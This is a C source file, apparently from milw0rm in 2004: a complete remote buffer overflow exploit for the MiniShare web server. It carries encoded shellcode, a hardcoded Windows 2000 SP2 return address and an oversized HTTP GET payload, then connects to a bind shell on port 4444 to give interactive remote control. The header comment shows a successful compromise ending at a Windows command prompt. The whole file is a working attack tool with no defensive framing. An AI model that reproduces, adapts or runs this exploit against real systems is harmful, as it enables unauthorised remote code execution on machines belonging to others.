/*
no@0x00:~/Exploits/minishare$ ./mini-exploit 10.20.30.2

***MiniShare remote buffer overflow UNIX exploit by NoPh0BiA.***

[x] Connected to: 10.20.30.2 on port 80.
[x] Sending bad code..done.
[x] Trying to connect to: 10.20.30.2 on port 4444..
[x] 0wn3d!

Microsoft Windows 2000 [Version 5.00.2195]
(C) Copyright 1985-2000 Microsoft Corp.

E:\Program Files\MiniShare>

Greetz to NtWaK0,kane,kamalo,foufz, and schap :)
http://NoPh0BiA.lostspirits.org

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <netinet/in.h>
#include <fcntl.h>

#define PORT 80
#define PORT1 4444
#define RET "\xB8\x9E\xE3\x77" /*2k sp2*/

char shellcode[]=
"\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\x34\x0a"
"\x2f\xfd\x83\xeb\xfc\xe2\xf4\xc8\xe2\x79\xfd\x34\x0a\x7c\xa8\x62"
"\x5d\xa4\x91\x10\x12\xa4\xb8\x08\x81\x7b\xf8\x4c\x0b\xc5\x76\x7e"
"\x12\xa4\xa7\x14\x0b\xc4\x1e\x06\x43\xa4\xc9\xbf\x0b\xc1\xcc\xcb"
"\xf6\x1e\x3d\x98\x32\xcf\x89\x33\xcb\xe0\xf0\x35\xcd\xc4\x0f\x0f"
"\x76\x0b\xe9\x41\xeb\xa4\xa7\x10\x0b\xc4\x9b\xbf\x06\x64\x76\x6e"
"\x16\x2e\x16\xbf\x0e\xa4\xfc\xdc\xe1\x2d\xcc\xf4\x55\x71\xa0\x6f"
"\xc8\x27\xfd\x6a\x60\x1f\xa4\x50\x81\x36\x76\x6f\x06\xa4\xa6\x28"
"\x81\x34\x76\x6f\x02\x7c\x95\xba\x44\x21\x11\xcb\xdc\xa6\x3a\xb5"
"\xe6\x2f\xfc\x34\x0a\x78\xab\x67\x83\xca\x15\x13\x0a\x2f\xfd\xa4"
"\x0b\x2f\xfd\x82\x13\x37\x1a\x90\x13\x5f\x14\xd1\x43\xa9\xb4\x90"
"\x10\x5f\x3a\x90\xa7\x01\x14\xed\x03\xda\x50\xff\xe7\xd3\xc6\x63"
"\x59\x1d\xa2\x07\x38\x2f\xa6\xb9\x41\x0f\xac\xcb\xdd\xa6\x22\xbd"
"\xc9\xa2\x88\x20\x60\x28\xa4\x65\x59\xd0\xc9\xbb\xf5\x7a\xf9\x6d"
"\x83\x2b\x73\xd6\xf8\x04\xda\x60\xf5\x18\x02\x61\x3a\x1e\x3d\x64"
"\x5a\x7f\xad\x74\x5a\x6f\xad\xcb\x5f\x03\x74\xf3\x3b\xf4\xae\x67"
"\x62\x2d\xfd\x25\x56\xa6\x1d\x5e\x1a\x7f\xaa\xcb\x5f\x0b\xae\x63"
"\xf5\x7a\xd5\x67\x5e\x78\x02\x61\x2a\xa6\x3a\x5c\x49\x62\xb9\x34"
"\x83\xcc\x7a\xce\x3b\xef\x70\x48\x2e\x83\x97\x21\x53\xdc\x56\xb3"
"\xf0\xac\x11\x60\xcc\x6b\xd9\x24\x4e\x49\x3a\x70\x2e\x13\xfc\x35"
"\x83\x53\xd9\x7c\x83\x53\xd9\x78\x83\x53\xd9\x64\x87\x6b\xd9\x24"
"\x5e\x7f\xac\x65\x5b\x6e\xac\x7d\x5b\x7e\xae\x65\xf5\x5a\xfd\x5c"
"\x78\xd1\x4e\x22\xf5\x7a\xf9\xcb\xda\xa6\x1b\xcb\x7f\x2f\x95\x99"
"\xd3\x2a\x33\xcb\x5f\x2b\x74\xf7\x60\xd0\x02\x02\xf5\xfc\x02\x41"
"\x0a\x47\x0d\xbe\x0e\x70\x02\x61\x0e\x1e\x26\x67\xf5\xff\xfd";

struct sockaddr_in hrm;

void shell(int sock)
{
fd_set fd_read;
char buff[1024];
int n;

while(1) {
FD_SET(sock,&fd_read);
FD_SET(0,&fd_read);

if(select(sock+1,&fd_read,NULL,NULL,NULL)<0) break;

if( FD_ISSET(sock, &fd_read) ) {
n=read(sock,buff,sizeof(buff));
if (n == 0) {
printf ("Connection closed.\n");
exit(EXIT_FAILURE);
} else if (n < 0) {
perror("read remote");
exit(EXIT_FAILURE);
}
write(1,buff,n);
}

if ( FD_ISSET(0, &fd_read) ) {
if((n=read(0,buff,sizeof(buff)))<=0){
perror ("read user");
exit(EXIT_FAILURE);
}
write(sock,buff,n);
}
}
close(sock);
}

int conn(char *ip, int p)
{
int sockfd;
hrm.sin_family = AF_INET;
hrm.sin_port = htons(p);
hrm.sin_addr.s_addr = inet_addr(ip);
bzero(&(hrm.sin_zero),8);
sockfd=socket(AF_INET,SOCK_STREAM,0);
if((connect(sockfd,(struct sockaddr*)&hrm,sizeof(struct sockaddr))) < 0 )
{
perror("connect");
exit(0);
}
return sockfd;
}

int main(int argc, char *argv[])
{
if(argc < 2)
{
printf("Usage: TARGET.\n");
exit(0);
}
char *buffer = malloc(2220),*B=malloc(30),*target=argv[1];
int x,y;
printf("\n***MiniShare remote buffer overflow UNIX exploit by NoPh0BiA.***\n\n");
memset(buffer,'\0',2220);
memset(B,0x42,30);
memset(buffer,0x41,1787);
strcat(buffer,RET);
strcat(buffer,B);
strcat(buffer,shellcode);
if((x = conn(target,PORT)))
printf("[x] Connected to: %s on port %d.\n",target,PORT);
sleep(3);
printf("[x] Sending bad code..");
write(x,"GET ",4);
write(x,buffer,2220);
write(x," HTTP/1.1\r\n\r\n",13);
sleep(3);
printf("done.\n");
printf("[x] Trying to connect to: %s on port %d..\n",target,PORT1);
if((y=conn(target,PORT1)))
{
printf("[x] 0wn3d!\n\n");
shell(y);
}

}

// milw0rm.com [2004-11-16]
